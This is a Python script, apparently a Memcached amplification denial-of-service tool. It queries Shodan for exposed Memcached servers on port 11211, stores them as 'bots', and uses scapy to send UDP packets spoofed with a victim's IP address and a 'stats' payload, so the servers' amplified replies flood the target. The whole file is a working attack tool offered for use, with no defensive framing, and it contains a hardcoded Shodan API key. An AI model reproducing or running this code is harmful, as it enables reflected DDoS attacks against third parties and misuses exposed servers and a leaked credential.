#-- coding: utf8 --
#!/usr/bin/env python3
import sys, os, time, shodan
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout

starttime = time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield

class color:
    HEADER = '\033[0m'


SHODAN_API_KEY = "7xdb7QrxXEqlMRWupdiprzezJMpuhgi5"


while True:
    api = shodan.Shodan(SHODAN_API_KEY)
    print('')
    try:
        myresults = Path("./bots.txt")
        query = input("[*] Use Shodan API to search for affected Memcached servers? <Y/n>: ").lower()
        if query.startswith('y'):
            print('')
            print('[~] Checking Shodan.io API Key: %s' % SHODAN_API_KEY)
            results = api.search('product:"Memcached" port:11211 -has_ipv6:true')
            print('[✓] API Key Authentication: SUCCESS')
            print('[~] Number of bots: %s' % results['total'])
            print('')
            print(results['matches'])
            print('')
            saveresult = input("[*] Save results for later usage? <Y/n>: ").lower()
            if saveresult.startswith('y'):
                file2 = open('./bots.txt', 'a')
                for result in results['matches']:
                    file2.write(result['ip_str'] + "\n")
                print('[~] File written: ./bots.txt')
                print('')
                file2.close()
        saveme = input('[*] Would you like to use locally stored Shodan data? <Y/n>: ').lower()
        if myresults.is_file():
            if saveme.startswith('y'):
                with open('./bots.txt') as my_file:
                    ip_array = [line.rstrip() for line in my_file]
        else:
            print('')
            print('[✘] Error: No bots stored locally, bots.txt file not found!')
            print('')
        if saveme.startswith('y') or query.startswith('y'):
            print('')
            target = input("[▸] Enter target IP address: ")
            power = int(input("[▸] Enter preferred power (Default 1): ") or "1")
            data = input("[▸] Enter payload contained inside packet: ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
            print('')
            if query.startswith('y'):
                iplist = input('[*] Would you like to display all the bots from Shodan? <Y/n>: ').lower()
                if iplist.startswith('y'):
                    print('')
                    counter= int(0)
                    for result in results['matches']:
                        host = api.host('%s' % result['ip_str'])
                        counter=counter+1
                        print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, result['ip_str'], host.get('os', 'n/a'), host.get('org', 'n/a')))
                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
            if saveme.startswith('y'):
                iplistlocal = input('[*] Would you like to display all the bots stored locally? <Y/n>: ').lower()
                if iplistlocal.startswith('y'):
                    print('')
                    counter= int(0)
                    for x in ip_array:
                        host = api.host('%s' % x)
                        counter=counter+1
                        print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, x, host.get('os', 'n/a'), host.get('org', 'n/a')))
                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
            print('')
            engage = input('[*] Ready to engage target %s? <Y/n>: ' % target).lower()
            if engage.startswith('y'):
                if saveme.startswith('y'):
                    for i in ip_array:
                        if power>1:
                            print('[+] Sending %d forged UDP packets to: %s' % (power, i))
                            with suppress_stdout():
                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)
                        elif power==1:
                            print('[+] Sending 1 forged UDP packet to: %s' % i)
                            with suppress_stdout():
                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)
                else:
                    for result in results['matches']:
                        if power>1:
                            print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
                            with suppress_stdout():
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
                        elif power==1:
                            print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
                            with suppress_stdout():
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
                print('')
                print('[•] Task complete! Exiting Platform. Have a wonderful day.')
                break
            else:
                print('')
                print('[✘] Error: %s not engaged!' % target)
                print('[~] Restarting Platform! Please wait.')
                print('')
        else:
            print('')
            print('[✘] Error: No bots stored locally or remotely on Shodan!')
            print('[~] Restarting Platform! Please wait.')
            print('')

    except shodan.APIError as e:
            print('[✘] Error: %s' % e)
            print('')
            print('[•] Exiting Platform. Have a wonderful day.')
            break
